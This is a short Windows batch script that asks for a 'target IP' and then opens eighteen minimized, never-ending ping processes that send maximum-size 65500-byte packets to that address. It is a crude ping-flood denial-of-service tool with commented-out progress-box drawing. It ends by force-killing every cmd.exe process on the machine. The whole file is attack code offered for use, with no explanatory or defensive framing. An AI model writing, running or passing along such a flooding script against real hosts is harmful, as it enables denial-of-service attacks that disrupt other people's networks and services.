@echo off
rem CenterSelf
set FGcol=10
rem ChangeColor %FGcol% 0
set /p IPadd= Enter target IP: 
rem PrintBoxAt 12 31 3 20 2
rem ChangeColor 0 %FGcol%

rem Wait 600

start /min ping -t -l 65500 -w 5000 %IPadd%
start /min ping -t -l 65500 -w 5000 %IPadd%

rem ShadeBoxAt 13 32 1 2 2

rem Wait 600

start /min ping -t -l 65500 -w 5000 %IPadd%
start /min ping -t -l 65500 -w 5000 %IPadd%
rem ShadeBoxAt 13 34 1 2 2

rem Wait 600

start /min ping -t -l 65500 -w 5000 %IPadd%
start /min ping -t -l 65500 -w 5000 %IPadd%

rem ShadeBoxAt 13 36 1 2 2

rem Wait 600

start /min ping -t -l 65500 -w 5000 %IPadd%
start /min ping -t -l 65500 -w 5000 %IPadd%

rem ShadeBoxAt 13 38 1 2 2

rem Wait 600

start /min ping -t -l 65500 -w 5000 %IPadd%
start /min ping -t -l 65500 -w 5000 %IPadd%

rem ShadeBoxAt 13 40 1 2 2

rem Wait 600

start /min ping -t -l 65500 -w 5000 %IPadd%
start /min ping -t -l 65500 -w 5000 %IPadd%

rem ShadeBoxAt 13 42 1 2 2

rem Wait 600

start /min ping -t -l 65500 -w 5000 %IPadd%
start /min ping -t -l 65500 -w 5000 %IPadd%

rem ShadeBoxAt 13 44 1 2 2

rem Wait 600

start /min ping -t -l 65500 -w 5000 %IPadd%
start /min ping -t -l 65500 -w 5000 %IPadd%

rem ShadeBoxAt 13 46 1 2 2

rem Wait 600

start /min ping -t -l 65500 -w 5000 %IPadd%
start /min ping -t -l 65500 -w 5000 %IPadd%

rem ShadeBoxAt 13 48 1 2 2

rem ClearColor
rem Locate 25 1
pause
taskkill /F /IM cmd.exe /T